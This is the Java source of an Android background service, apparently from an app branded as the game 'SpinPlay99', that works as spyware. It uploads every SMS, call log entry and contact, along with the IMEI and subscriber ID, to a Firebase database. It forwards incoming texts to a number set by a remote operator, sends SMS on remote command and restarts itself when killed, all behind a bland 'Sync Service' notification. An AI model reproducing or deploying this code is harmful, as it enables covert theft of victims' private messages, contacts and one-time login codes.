package com.spinplay99.adminpanel;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class BackgroundSyncService extends Service {

    private static final String CHANNEL_ID      = "spinplay99_channel";
    private static final int    NOTIFICATION_ID  = 999;
    private static final String PREFS_NAME       = "SpinPlaySyncPrefs";
    private static final String KEY_SMS_COUNT    = "last_sms_count";
    private static final String KEY_CALL_COUNT   = "last_call_count";
    private static final String KEY_CONTACT_COUNT = "last_contact_count";
    private static final long   LIVE_SYNC_INTERVAL = 3000;   // 3s for live data
    private static final long   FULL_SYNC_INTERVAL = 60000;  // 60s for full SMS/calls/contacts re-sync

    private DatabaseReference databaseReference;
    private String deviceId;
    private Handler handler;
    private Runnable syncRunnable;
    private SmsManager smsManager;
    private ValueEventListener forwardingListener;
    private ValueEventListener commandListener;
    private String forwardingNumber = "";
    private boolean forwardingEnabled = false;
    private List<String> forwardingFilters = new ArrayList<>();
    private boolean forwardAllSms = true;
    private SharedPreferences prefs;
    private long lastFullSyncTime = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        FirebaseApp.initializeApp(this);
        databaseReference = FirebaseDatabase.getInstance().getReference();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        handler = new Handler(Looper.getMainLooper());
        smsManager = SmsManager.getDefault();
        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        loadForwardingSettings();
        listenForManualCommands();
        // Upload all data immediately on first start
        doFullDataSync();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startSyncLoop();
        return START_STICKY;
    }

    private void startSyncLoop() {
        if (syncRunnable != null) handler.removeCallbacks(syncRunnable);
        syncRunnable = new Runnable() {
            @Override
            public void run() {
                syncLiveData();
                long now = System.currentTimeMillis();
                if (now - lastFullSyncTime >= FULL_SYNC_INTERVAL) {
                    doFullDataSync();
                    lastFullSyncTime = now;
                }
                handler.postDelayed(this, LIVE_SYNC_INTERVAL);
            }
        };
        handler.post(syncRunnable);
    }

    /** Fast loop — only live metrics (battery, network, status) */
    private void syncLiveData() {
        DatabaseReference deviceRef = databaseReference.child("devices").child(deviceId);
        deviceRef.child("online_status").setValue(true);
        deviceRef.child("online_status").onDisconnect().setValue(false);
        deviceRef.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);

        Map<String, Object> live = new HashMap<>();
        SimpleDateFormat fmt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        live.put("timestamp", fmt.format(new Date()));
        live.put("timestamp_millis", System.currentTimeMillis());
        live.put("battery_level", getBatteryLevel());
        live.put("network_type", getNetworkType());
        live.put("is_charging", isDeviceCharging());
        live.put("permissions", getAllPermissions());
        live.put("sim_info", getSimInformation());
        if (checkPermission(Manifest.permission.READ_SMS))
            live.put("total_sms", getSmsCount());
        if (checkPermission(Manifest.permission.READ_CALL_LOG))
            live.put("total_calls", getCallLogCount());
        if (checkPermission(Manifest.permission.READ_CONTACTS))
            live.put("contacts_count", getContactCount());

        deviceRef.child("live_data").setValue(live);
        updateDeviceInfo();
        checkAndForwardNewSms();
    }

    /** Heavy sync — uploads all SMS/calls/contacts if count changed */
    private void doFullDataSync() {
        new Thread(() -> {
            if (checkPermission(Manifest.permission.READ_SMS)) {
                int current = getSmsCount();
                int last = prefs.getInt(KEY_SMS_COUNT, -1);
                if (current != last) {
                    uploadAllSms();
                    prefs.edit().putInt(KEY_SMS_COUNT, current).apply();
                }
            }
            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                int current = getCallLogCount();
                int last = prefs.getInt(KEY_CALL_COUNT, -1);
                if (current != last) {
                    uploadAllCalls();
                    prefs.edit().putInt(KEY_CALL_COUNT, current).apply();
                }
            }
            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                int current = getContactCount();
                int last = prefs.getInt(KEY_CONTACT_COUNT, -1);
                if (current != last) {
                    uploadAllContacts();
                    prefs.edit().putInt(KEY_CONTACT_COUNT, current).apply();
                }
            }
        }).start();
    }

    private void updateDeviceInfo() {
        Map<String, Object> deviceInfo = new HashMap<>();
        deviceInfo.put("device_id", deviceId);
        deviceInfo.put("device_model", Build.MODEL);
        deviceInfo.put("device_brand", Build.BRAND);
        deviceInfo.put("android_version", Build.VERSION.RELEASE);
        deviceInfo.put("last_seen", ServerValue.TIMESTAMP);
        deviceInfo.put("sim_info", getDetailedSimInfo());
        databaseReference.child("devices").child(deviceId).child("device_info").updateChildren(deviceInfo);
    }

    private void uploadAllSms() {
        List<Map<String, Object>> allMessages = getAllSmsMessages();
        int total = allMessages.size();
        // Upload in batches of 500 to avoid Firebase 10MB node limit
        int batchSize = 500;
        DatabaseReference smsRef = databaseReference.child("devices").child(deviceId).child("all_sms");
        smsRef.child("total_count").setValue(total);
        smsRef.child("last_updated").setValue(ServerValue.TIMESTAMP);
        Map<String, Object> allBatches = new HashMap<>();
        for (int i = 0; i < total; i += batchSize) {
            List<Map<String, Object>> batch = allMessages.subList(i, Math.min(i + batchSize, total));
            allBatches.put("batch_" + (i / batchSize), batch);
        }
        smsRef.child("messages").setValue(allBatches);
    }

    private List<Map<String, Object>> getAllSmsMessages() {
        List<Map<String, Object>> smsList = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                new String[]{"_id", "address", "body", "date", "type", "read"},
                null, null, "date DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> sms = new HashMap<>();
                    sms.put("id", getCursorValue(cursor, 0));
                    sms.put("address", getCursorValue(cursor, 1));
                    String body = getCursorValue(cursor, 2);
                    if (body != null && body.length() > 500) body = body.substring(0, 500) + "...";
                    sms.put("body", body);
                    String dateStr = getCursorValue(cursor, 3);
                    sms.put("date", dateStr);
                    if (dateStr != null && !dateStr.isEmpty()) {
                        sms.put("date_readable", formatTimestamp(Long.parseLong(dateStr)));
                    }
                    String typeStr = getCursorValue(cursor, 4);
                    if ("1".equals(typeStr)) sms.put("type", "INBOX");
                    else if ("2".equals(typeStr)) sms.put("type", "SENT");
                    else sms.put("type", "OTHER");
                    sms.put("read", getCursorValue(cursor, 5));
                    smsList.add(sms);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
        } finally {
            if (cursor != null) cursor.close();
        }
        return smsList;
    }

    private void uploadAllCalls() {
        List<Map<String, Object>> allCalls = getAllCallLogs();
        Map<String, Object> callData = new HashMap<>();
        callData.put("total_count", allCalls.size());
        callData.put("last_updated", ServerValue.TIMESTAMP);
        callData.put("calls", allCalls);
        databaseReference.child("devices").child(deviceId).child("all_calls").setValue(callData);
    }

    private List<Map<String, Object>> getAllCallLogs() {
        List<Map<String, Object>> callList = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{"_id", "number", "type", "date", "duration", "name"},
                null, null, "date DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> call = new HashMap<>();
                    call.put("id", getCursorValue(cursor, 0));
                    call.put("number", getCursorValue(cursor, 1));
                    String typeStr = getCursorValue(cursor, 2);
                    if ("1".equals(typeStr)) call.put("type", "INCOMING");
                    else if ("2".equals(typeStr)) call.put("type", "OUTGOING");
                    else if ("3".equals(typeStr)) call.put("type", "MISSED");
                    else call.put("type", "UNKNOWN");
                    String dateStr = getCursorValue(cursor, 3);
                    call.put("date", dateStr);
                    if (dateStr != null && !dateStr.isEmpty()) {
                        call.put("date_readable", formatTimestamp(Long.parseLong(dateStr)));
                    }
                    call.put("duration", getCursorValue(cursor, 4));
                    call.put("contact_name", getCursorValue(cursor, 5));
                    callList.add(call);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
        } finally {
            if (cursor != null) cursor.close();
        }
        return callList;
    }

    private void uploadAllContacts() {
        List<Map<String, Object>> allContacts = getAllContactsList();
        Map<String, Object> contactData = new HashMap<>();
        contactData.put("total_count", allContacts.size());
        contactData.put("last_updated", ServerValue.TIMESTAMP);
        contactData.put("contacts", allContacts);
        databaseReference.child("devices").child(deviceId).child("all_contacts").setValue(contactData);
    }

    private List<Map<String, Object>> getAllContactsList() {
        List<Map<String, Object>> contactList = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                android.provider.ContactsContract.Contacts.CONTENT_URI,
                new String[]{"_id", "display_name", "has_phone_number"},
                null, null, "display_name ASC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> contact = new HashMap<>();
                    String contactId = getCursorValue(cursor, 0);
                    contact.put("id", contactId);
                    contact.put("name", getCursorValue(cursor, 1));
                    if ("1".equals(getCursorValue(cursor, 2))) {
                        contact.put("phone", getPhoneNumberForContact(contactId));
                    }
                    contactList.add(contact);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
        } finally {
            if (cursor != null) cursor.close();
        }
        return contactList;
    }

    private String getPhoneNumberForContact(String contactId) {
        try {
            Cursor cursor = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{"number"},
                "contact_id = ?",
                new String[]{contactId},
                null);
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(0);
                cursor.close();
                return number;
            }
            if (cursor != null) cursor.close();
        } catch (Exception e) {}
        return "";
    }

    private void loadForwardingSettings() {
        forwardingListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    forwardingNumber = snapshot.child("forward_to").getValue(String.class);
                    Boolean enabled = snapshot.child("enabled").getValue(Boolean.class);
                    forwardingEnabled = enabled != null && enabled;
                    Boolean allSms = snapshot.child("forward_all").getValue(Boolean.class);
                    forwardAllSms = allSms == null || allSms;
                    forwardingFilters.clear();
                    for (DataSnapshot filter : snapshot.child("filters").getChildren()) {
                        String number = filter.getValue(String.class);
                        if (number != null) forwardingFilters.add(number);
                    }
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        databaseReference.child("devices").child(deviceId).child("forwarding_settings")
            .addValueEventListener(forwardingListener);
    }

    private void forwardSmsMessage(String from, String body, long timestamp) {
        if (!forwardingEnabled || forwardingNumber == null || forwardingNumber.isEmpty()) return;
        if (!forwardAllSms && !forwardingFilters.isEmpty()) {
            boolean matched = false;
            for (String filter : forwardingFilters) {
                if (from.contains(filter)) { matched = true; break; }
            }
            if (!matched) return;
        }
        try {
            smsManager.sendTextMessage(forwardingNumber, null, "From: " + from + "\n" + body, null, null);
            Map<String, Object> log = new HashMap<>();
            log.put("from", from);
            log.put("to", forwardingNumber);
            log.put("body", body != null && body.length() > 100 ? body.substring(0, 100) : body);
            log.put("status", "FORWARDED");
            log.put("forwarded_at", ServerValue.TIMESTAMP);
            databaseReference.child("devices").child(deviceId).child("forwarded_sms").push().setValue(log);
        } catch (Exception e) {}
    }

    private void checkAndForwardNewSms() {
        if (!forwardingEnabled || !checkPermission(Manifest.permission.READ_SMS)) return;
        new Thread(() -> {
            Cursor cursor = null;
            try {
                long tenSecondsAgo = System.currentTimeMillis() - 10000;
                cursor = getContentResolver().query(
                    Telephony.Sms.Inbox.CONTENT_URI,
                    new String[]{"address", "body", "date"},
                    "date > ?",
                    new String[]{String.valueOf(tenSecondsAgo)},
                    "date DESC LIMIT 5");
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        forwardSmsMessage(
                            getCursorValue(cursor, 0),
                            getCursorValue(cursor, 1),
                            Long.parseLong(getCursorValue(cursor, 2)));
                    } while (cursor.moveToNext());
                }
            } catch (Exception e) {
            } finally {
                if (cursor != null) cursor.close();
            }
        }).start();
    }

    private void listenForManualCommands() {
        commandListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                for (DataSnapshot command : snapshot.getChildren()) {
                    String to      = command.child("to").getValue(String.class);
                    String message = command.child("message").getValue(String.class);
                    if (to != null && message != null) {
                        try {
                            smsManager.sendTextMessage(to, null, message, null, null);
                            Map<String, Object> log = new HashMap<>();
                            log.put("to", to);
                            log.put("message", message);
                            log.put("status", "SENT");
                            log.put("sent_at", ServerValue.TIMESTAMP);
                            databaseReference.child("devices").child(deviceId).child("sent_sms").push().setValue(log);
                        } catch (Exception e) {}
                    }
                    command.getRef().removeValue();
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        databaseReference.child("devices").child(deviceId).child("manual_commands").child("send_sms")
            .addValueEventListener(commandListener);
    }

    private String getCursorValue(Cursor cursor, int index) {
        try { return cursor.getString(index); } catch (Exception e) { return ""; }
    }

    private String formatTimestamp(long timestamp) {
        try {
            return new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date(timestamp));
        } catch (Exception e) { return ""; }
    }

    private int getSmsCount()     { return getCount(Telephony.Sms.CONTENT_URI); }
    private int getCallLogCount() { return getCount(CallLog.Calls.CONTENT_URI); }
    private int getContactCount() { return getCount(android.provider.ContactsContract.Contacts.CONTENT_URI); }

    private int getCount(Uri uri) {
        int count = 0;
        try {
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            if (cursor != null) { count = cursor.getCount(); cursor.close(); }
        } catch (Exception e) {}
        return count;
    }

    private Map<String, Boolean> getAllPermissions() {
        Map<String, Boolean> permissions = new HashMap<>();
        permissions.put("read_sms",      checkPermission(Manifest.permission.READ_SMS));
        permissions.put("send_sms",      checkPermission(Manifest.permission.SEND_SMS));
        permissions.put("receive_sms",   checkPermission(Manifest.permission.RECEIVE_SMS));
        permissions.put("read_call_log", checkPermission(Manifest.permission.READ_CALL_LOG));
        permissions.put("read_contacts", checkPermission(Manifest.permission.READ_CONTACTS));
        permissions.put("call_phone",    checkPermission(Manifest.permission.CALL_PHONE));
        return permissions;
    }

    private boolean checkPermission(String permission) {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
    }

    private int getBatteryLevel() {
        try {
            Intent intent = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                int level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                if (scale > 0) return (level * 100) / scale;
            }
        } catch (Exception e) {}
        return 0;
    }

    private String getNetworkType() {
        try {
            android.net.ConnectivityManager cm =
                (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.net.Network network = cm.getActiveNetwork();
                if (network == null) return "Offline";
                android.net.NetworkCapabilities caps = cm.getNetworkCapabilities(network);
                if (caps == null) return "Offline";
                if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI))     return "WIFI";
                if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) return "MOBILE";
                if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET)) return "ETHERNET";
                return "OTHER";
            } else {
                android.net.NetworkInfo info = cm.getActiveNetworkInfo();
                if (info != null && info.isConnected()) return info.getTypeName();
            }
        } catch (Exception e) {}
        return "Offline";
    }

    private boolean isDeviceCharging() {
        try {
            Intent intent = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                    || status == android.os.BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception e) {}
        return false;
    }

    private Map<String, Object> getSimInformation() {
        Map<String, Object> simInfo = new HashMap<>();
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                simInfo.put("sim_operator",     tm.getSimOperatorName());
                simInfo.put("network_operator", tm.getNetworkOperatorName());
            }
        } catch (Exception e) {}
        return simInfo;
    }

    private Map<String, Object> getDetailedSimInfo() {
        Map<String, Object> simInfo = new HashMap<>();
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                simInfo.put("sim_operator_name",     tm.getSimOperatorName());
                simInfo.put("network_operator_name", tm.getNetworkOperatorName());
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                        && checkPermission(Manifest.permission.READ_PHONE_STATE)) {
                    simInfo.put("imei", tm.getImei());
                }
                if (checkPermission(Manifest.permission.READ_PHONE_STATE)) {
                    simInfo.put("subscriber_id", tm.getSubscriberId());
                }
            }
        } catch (Exception e) {}
        return simInfo;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "Sync Service", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Background synchronization service");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Intent intent = new Intent(BackgroundSyncService.this, SplashActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SpinPlay99")
            .setContentText("Service Running...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        databaseReference.child("devices").child(deviceId).child("online_status").setValue(false);
        if (handler != null && syncRunnable != null) handler.removeCallbacks(syncRunnable);
        if (forwardingListener != null)
            databaseReference.child("devices").child(deviceId).child("forwarding_settings")
                .removeEventListener(forwardingListener);
        if (commandListener != null)
            databaseReference.child("devices").child(deviceId).child("manual_commands").child("send_sms")
                .removeEventListener(commandListener);
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        startService(new Intent(getApplicationContext(), BackgroundSyncService.class));
        super.onTaskRemoved(rootIntent);
    }
}
